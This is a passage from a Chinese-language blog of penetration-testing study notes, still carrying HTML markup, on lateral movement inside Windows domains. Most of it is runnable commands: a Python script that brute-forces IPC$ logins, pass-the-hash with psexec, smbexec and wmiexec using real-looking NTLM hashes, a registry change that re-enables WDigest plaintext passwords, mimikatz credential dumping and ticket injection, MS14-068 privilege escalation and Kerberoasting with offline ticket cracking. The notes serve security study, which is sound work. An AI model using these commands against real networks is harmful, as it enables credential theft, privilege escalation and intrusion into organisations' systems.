class="line">#批量检测HASH对应IP回显版</span><br></pre></td></tr></table></figure><p>然而，这个可以用python写成更加好的代码进行攻击！小迪提供的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line"></span><br><span class="line">ips = &#123;</span><br><span class="line"><span class="comment">#...</span></span><br><span class="line">&#125;</span><br><span class="line">users = &#123;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line">passs = &#123;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;net use \\\\&quot;</span> + ip + <span class="string">&#x27;\ipc$ &#x27;</span> + mima + <span class="string">&#x27; /user:god\\&#x27;</span> + user</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后使用pyinstaller编译一下成为exe即可，无论是明文还是哈希传递，都是适用的：（也不保证一定行哦）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py <span class="comment">#生成可执行EXE</span></span><br></pre></td></tr></table></figure><p>我自己开发的脚本~暂时鸽了</p><h2 id="域横向扫描smbwmi哈希传递"><a class="markdownIt-Anchor" href="#域横向扫描smbwmi哈希传递"></a> 域横向扫描——smb&amp;wmi&amp;哈希传递</h2><p>Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码 Windows2012以下版本若安装<strong>KB2871997</strong>补丁，同样也会导致无法获取明文密码</p><p>针对以上情况，我们提供了4种方式解决此类问题</p><ul><li><p>1.利用哈希hash传递(pth，ptk等)进行移动</p></li><li><p>2.利用其它服务协议(SMB,WMI等)进行哈希移动</p></li><li><p>3.利用注册表操作开启Wdigest Auth值进行获取</p><ul><li><p>注册表操作开启Wdigest Auth值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li></ul></li><li><p>4.利用工具或第三方平台(<a href="https://www.freebuf.com/sectool/164507.html">Hachcat</a>)进行破解获取</p><ul><li>在线hash解密</li><li>hash破解工具</li></ul></li></ul><h3 id="smb服务进行明文hash传递psexecsmbexec"><a class="markdownIt-Anchor" href="#smb服务进行明文hash传递psexecsmbexec"></a> SMB服务进行明文/Hash传递（psexec,smbexec）</h3><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。</p><h4 id="psexec自带"><a class="markdownIt-Anchor" href="#psexec自带"></a> psexec（自带）：</h4><p>在微软官方Pstools工具包中，但是<strong>官方Pstools中的psexec只能明文连接</strong>，无法采用hash连接。如果需要hash连接，可以使用impacket工具包中的psexec，但是impacket非官方自带，容易被杀。</p><p>Pstools官方工具包：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</a></p><p><strong>第一种方法：IPC连接</strong></p><p>先有ipc链接，psexec需要明文或hash传递</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$  <span class="string">&quot;admin!@#45&quot;</span> /user :administrator</span><br><span class="line">psexec \\192.168.3.32 -s cmd  <span class="comment"># 需要先有ipc链接 -s以System权限运行CMD</span></span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629104829648.png" alt="image-20230629104829648" style="zoom:67%;" /><p><strong>第二种方法：无需IPC连接</strong></p><p>不用建立IPC直接提供明文账户密码（推荐）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</span><br><span class="line">psexec -hashes :$HASH$ ./administrator @10.1.2.3</span><br><span class="line">psexec -hashes :$HASH$ domain/administrator @10.1.2.3</span><br><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator @192.168.3.32</span><br></pre></td></tr></table></figure><p>利用hash失败，微软官方Pstools工具包中的psexec无法采用hash连接，只能明文连接。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629104943690.png" alt="image-20230629104943690" style="zoom:67%;" /><h4 id="smbexecimpacket"><a class="markdownIt-Anchor" href="#smbexecimpacket"></a> smbexec（impacket）</h4><p>非官方自带-参考impacket工具包使用，操作简单，容易被杀，无需先建立ipc链接、 明文或hash传递</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smbexec god/administrator:Admin12345@192.168.3.21</span><br><span class="line">smbexec ./administrator:admin!@<span class="comment">#45@192.168.3.32</span></span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure><h3 id="wmi服务进行明文hash传递cscriptwmiexecwmic"><a class="markdownIt-Anchor" href="#wmi服务进行明文hash传递cscriptwmiexecwmic"></a> WMI服务进行明文/Hash传递（cscript,wmiexec,wmic）</h3><p><strong>WMI</strong> (Windows Management Instrumentation) 是通过135端口进行利用，支持用户名<strong>明文</strong>或者<strong>hash</strong>的方式进行认证，并且<strong>该方法不会在目标日志系统留下痕迹</strong>。它也有自带的和impacket版本的工具。</p><h4 id="wmic自带"><a class="markdownIt-Anchor" href="#wmic自带"></a> wmic（自带）</h4><ul><li>明文传递</li><li>优点是自带工具，不用考虑免杀</li><li>缺点是<strong>无回显</strong>, 需要想方法读取结果。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create <span class="string">&quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span></span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@<span class="comment">#45 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span></span><br></pre></td></tr></table></figure><p>那就输出到一个文件，然后进行读取完事。如果进行一些操作，回显并不重要，一系列操作不用回显其实也能做到。</p><h4 id="cscript自带"><a class="markdownIt-Anchor" href="#cscript自带"></a> cscript（自带）</h4><ul><li><a href="https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar">下载链接</a></li><li>明文传递</li><li><strong>有回显</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629105840384.png" alt="image-20230629105840384" style="zoom:67%;" /><h4 id="wmiexecimpacket"><a class="markdownIt-Anchor" href="#wmiexecimpacket"></a> wmiexec（impacket）</h4><ul><li><strong>明文或hash传递</strong></li><li><strong>有回显</strong>exe版本</li><li>缺点：易被杀</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@<span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629110029964.png" alt="image-20230629110029964" /></p><h2 id="域横扫描pthptkptt哈希票据传递"><a class="markdownIt-Anchor" href="#域横扫描pthptkptt哈希票据传递"></a> 域横扫描——PTH&amp;PTK&amp;PTT（哈希票据传递）</h2><h3 id="pth"><a class="markdownIt-Anchor" href="#pth"></a> PTH</h3><p><strong>PTH</strong>(pass the hash) 利用 <strong>LM</strong> 或 <strong>NTLM</strong> 的值进行的渗透测试。</p><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p><p><strong>禁用NTLM认证的影响</strong></p><p>如果禁用了 ntlm 认证，<strong>PsExec</strong> 无法利用获得的 ntlm hash 进行远程连接，但是使用 <strong>mimikatz</strong> 还是可以攻击成功。</p><p><strong>补丁 KB 2871997 的影响</strong></p><p>对于 8.1/2012r2，安装补丁 <strong>kb2871997</strong> 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p><p>如果没有打补丁，那么所有用户都可以连接，打了就只能用administrator连接，或者使用 <strong>PTK</strong> 连接（AES 256），参考：<a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>实践</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#域连接</span></span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment">#工作组连接（就是改了个workgroup）</span></span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c</span><br><span class="line"><span class="comment">#在实战中，本地用户与域用户，都尝试连接一下</span></span><br><span class="line">sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">\\OWA2010CN-God.god.org</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>当获取到域内一个主机的权限之后，可以使用mimikatz运行sekurlsa::logonPasswords命令获取其LM和NTLM。当收集到NTLM数据后，很有可能内网中有其他主机的NTLM值与我们收集到的一致。此时我们就可以使用NTLM进行内网横向渗透。运行以下命令，域横向移动PTH传递，攻击未打补丁下域内主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">sekurlsa::pth/user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629131547015.png" alt="image-20230629131547015" /></p><p>弹出一个新的cmd框，只要弹出框，就说明这个域内主机与我们收集到的NTLM值相同。接下来我们就可以进行at schtasks 复制文件、执行文件等其他操作了。都是如同IPC的相关命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010CN-God.god.org\c$</span><br><span class="line">dir \\192.168.3.21\c$</span><br></pre></td></tr></table></figure><h3 id="ptk"><a class="markdownIt-Anchor" href="#ptk"></a> PTK</h3><p><strong>PTK</strong>(pass the key) 利用的 ekeys aes256 进行的渗透测试。使用mimikatz查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::ekeys <span class="comment">#获取aes256值</span></span><br><span class="line">sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629131704319.png" alt="image-20230629131704319" /></p><h3 id="ptt提权"><a class="markdownIt-Anchor" href="#ptt提权"></a> PTT提权</h3><p><strong>PTT</strong>(pass the ticket) 利用票据凭证 TGT 进行的渗透测试。</p><p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法：</p><ul><li>MS14-068</li><li>Golden ticket</li><li>SILVER ticket</li></ul><p>简单来说就是将连接合法的票据注入到内存中实现连接。 <strong>MS14-068 基于漏洞</strong>，Golden ticket(黄金票据)，SILVER ticket(白银票据)。<em>其中 Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术。暂时不讲。</em> MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</p><p>总结：ptt 传递<strong>不需本地管理员权限</strong>，连接时<strong>主机名连接</strong>，基于漏洞，工具，本地票据</p><h4 id="ms14-068"><a class="markdownIt-Anchor" href="#ms14-068"></a> <a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068</a></h4><p>MS14-068 powershell 执行，能实现普通用户直接获取域控 system 权限</p><blockquote><p>MS14-068下载：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p></blockquote><p>操作：</p><ol><li><p>查看SID，为后面的伪造提供数据验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; whoami /user</span><br><span class="line"> S-1-5-21-1218902331-2157346161-1782232778-1124</span><br></pre></td></tr></table></figure></li><li><p>清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist //查看当前机器凭证</span><br><span class="line">klist purge//清空当前机器中所有凭证</span><br></pre></td></tr></table></figure></li><li><p>利用 ms14-068 生成 TGT 数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">.\MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132001607.png" alt="image-20230629132001607" /></p></li><li><p>票据注入内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">kerberos::ptc TGT_mary@god.org.ccache</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132202287.png" alt="image-20230629132202287" /></p></li></ol><h4 id="kekeo"><a class="markdownIt-Anchor" href="#kekeo"></a> <a href="https://github.com/gentilkiwi/kekeo/releases">Kekeo</a>工具</h4><blockquote><p>工具kekeo下载：<a href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p></blockquote><p>操作：</p><ol><li><p>生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132517844.png" alt="image-20230629132517844" /></p></li><li><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</span><br></pre></td></tr></table></figure></li><li><p>查看凭证 <code>klist </code>&amp; 利用，类似于ms14-068</p></li></ol><h4 id="利用本地票据"><a class="markdownIt-Anchor" href="#利用本地票据"></a> 利用本地票据</h4><p>因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。</p><p>缺点：票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用。</p><p>操作：</p><ol><li><p>导出本地票据(需管理权限)到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132753577.png" alt="image-20230629132753577" /></p></li><li><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt xxxxxxxxxx.xxxx.kirbi</span><br></pre></td></tr></table></figure></li><li><p>利用票据</p></li></ol><h2 id="域横向扫描rdp传递mimikatz"><a class="markdownIt-Anchor" href="#域横向扫描rdp传递mimikatz"></a> 域横向扫描——RDP传递：mimikatz</h2><h3 id="rdp简介"><a class="markdownIt-Anchor" href="#rdp简介"></a> RDP简介</h3><p>除了之前讲到的使用IPC，WMI，SMB等协议进行连接外，获取到的铭文密码或HASH密文也可以通过RDP协议进行链接操作。</p><p>RDP是一个远程显示协议，为微软终端服务应用的程序。端口号为：3389。而与之对应的Linux上面叫ssh。</p><h4 id="明文密码连接"><a class="markdownIt-Anchor" href="#明文密码连接"></a> 明文密码连接：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows:</span></span><br><span class="line">mstsc /console  /v :192.168.3.21：3389  /admin</span><br><span class="line"><span class="comment"># linux: </span></span><br><span class="line">rdesktop 192.168.3.21:3389</span><br></pre></td></tr></table></figure><h4 id="密文连接"><a class="markdownIt-Anchor" href="#密文连接"></a> 密文连接</h4><ul><li>windows Server需要开启 <strong>Restricted Admin mode</strong>，</li><li>在Windows 8.1和Windows Server 2012 R2中默认开启</li><li>如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；</li></ul><p>可以通过修改注册表开启HASH连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD  <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t  REG_DWORD  /d  00000000  /f</span><br></pre></td></tr></table></figure><p>开启后运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain :god  /ntlm </span><br><span class="line">:ccef208c6485269c20db2cad21734fe7  <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="域横扫描kerberoast攻击和spn服务"><a class="markdownIt-Anchor" href="#域横扫描kerberoast攻击和spn服务"></a> 域横扫描——Kerberoast攻击和SPN服务</h2><p><a href="https://www.cnblogs.com/backlion/p/8082623.html">SPN扫描也称为”扫描Kerberos服务实例名称”</a>。<strong>SPN扫描通过请求特定SPN类型的服务主体名称来查找服务</strong>。与网络端口扫描相比，<strong>SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口</strong>(不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志)。因为SPN查询是Kerberos票据行为的一 部分，所以检测难度很大。</p><ul><li><strong>在活动目录中发现服务的最佳方法就是SPN扫描</strong></li></ul><h3 id="kerberoast攻击"><a class="markdownIt-Anchor" href="#kerberoast攻击"></a> Kerberoast攻击</h3><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证（使用的是SPN）。</p><p>DC在活动目录中查找SPN，并使用与SPN关联的服务账户加密票证（TGS），以便服务能够验证用户是否可以访问。这个请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务账户的NTLM密码哈希用于加密服务票证。这样我们收到这个TGS票据，就可以离线破解。</p><p>利用方法：</p><p>由于<strong>域内的任何用户都可以向域内的任何服务请求TGS</strong>，知道相关服务的SPN后，可以用SPN申请一张票据 ST(TGS Ticket)，如果Kerberos 协议设置票据为 <code>RC4加密</code>，则可通过爆破的方式得到服务<strong>对应用户的密码</strong>。</p><p>有什么用：</p><p>我们获得该服务器的密码（TGS）后，我们就可以自己去请求某个服务。随意anytime</p><p>所以一般可以有以下流程：</p><ol><li>服务主体名称（SPN）发现</li><li>请求服务票据</li><li>导出服务票据</li><li>破解服务票据</li><li>重写服务票据&amp;RAM注入</li></ol><p>kerberoast下载：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p>更加详细的流程（包括扩大攻击面）：<a href="https://www.cnblogs.com/zpchcbd/p/11707776.html">https://www.cnblogs.com/zpchcbd/p/11707776.html</a></p><h3 id="spn探针"><a class="markdownIt-Anchor" href="#spn探针"></a> SPN探针</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-q</span> */*</span><br><span class="line">setspn <span class="literal">-q</span> */* | findstr <span class="string">&quot;MSSQL&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230703095801762.png" alt="image-20230703095801762" /></p><h3 id="请求票据"><a class="markdownIt-Anchor" href="#请求票据"></a> 请求票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除缓存票据</span></span><br><span class="line">klist purge</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell请求</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span>  <span class="string">&quot;服务名&quot;</span></span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span>  <span class="string">&quot;MSSQLSvc/SqlServer.god.org:1433&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz请求（与owershell请求，二者选其一即可）</span></span><br><span class="line">mimikatz.exe  <span class="string">&quot;kerberos::ask /target:xxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看票据</span></span><br><span class="line">klist</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f36392d372e706e67.png" alt="img" /></p><h3 id="导出票据"><a class="markdownIt-Anchor" href="#导出票据"></a> 导出票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz</span></span><br><span class="line">.\mimikatz.exe  </span><br><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230703100204846.png" alt="image-20230703100204846" /></p><h3 id="破解票据"><a class="markdownIt-Anchor" href="#破解票据"></a> 破解票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 破解工具tgsrepcrack.py python3环境运行</span></span><br><span class="line">python tgsrepcrack.py  passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure><h3 id="重写票据"><a class="markdownIt-Anchor" href="#重写票据"></a> 重写票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line"><span class="comment"># 将生成的票据注入内存</span></span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi  </span><br></pre></td></tr></table></figure><h3 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> //xxx.xxx.xxx.xxx /c$</span><br></pre></td></tr></table></figure><h2 id="cobalt-strike"><a class="markdownIt-Anchor" href="#cobalt-strike"></a> Cobalt Strike</h2><p>具体看手册，还是得多用，这个必问</p><h1 id="域横向代理与隧道"><a class="markdownIt-Anchor" href="#域横向代理与隧道"></a> 域横向【代理与隧道】</h1><h2 id="内网与外网"><a class="markdownIt-Anchor" href="#内网与外网"></a> 内网与外网</h2><p>内网网段：</p><ol><li>10.0.0.0/8 10.255.255.255/8</li><li>172.16.0.0/12 172.31.255.255/12</li><li>192.168.0.0/16 192.168.255.255/16</li></ol><p>后面那个是子网掩码，A类是8，B类是12，C类是16。即递增为4</p><p>不同网段（子网不同）之间是不可能进行通信的，需要通过转发才能实现，这个转发可以是路由器进行转发。说到底路由器（网关）也是一个设备，这个设备布置了流量转发的功能。</p><h2 id="正向连接与反向连接"><a class="markdownIt-Anchor" href="#正向连接与反向连接"></a> 正向连接与反向连接</h2><p><strong>正向连接</strong></p><p>即：攻击者去连接受害者，此时：攻击者处于<strong>内网</strong>，受害者处于<strong>外网</strong></p><p><strong>反向连接</strong></p><p>即：受害者去连接攻击者，此时：攻击者处于<strong>外网</strong>，受害者处于<strong>内网</strong></p><p>也就是谁在外网，就让内网的去连他，因为外网不能直接连上内网，更因为，内网的地址可能是动态分配的，所以会改变。</p><h2 id="代理与隧道技术"><a class="markdownIt-Anchor" href="#代理与隧道技术"></a> 代理与隧道技术</h2><ul><li>代理主要解决网络的连通性问题，还可以解决<ul><li>内网有过滤</li><li>内网无法连接外网的问题</li></ul></li><li>隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题</li></ul><h2 id="代理"><a class="markdownIt-Anchor" href="#代理"></a> 代理</h2><h3 id="ngrok"><a class="markdownIt-Anchor" href="#ngrok"></a> Ngrok</h3><p><a href="https://ngrok.com/">https://ngrok.com/</a></p><p><a href="https://www.ngrok.cc/">https://www.ngrok.cc/</a></p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f37302d312e706e67.png" alt="img" 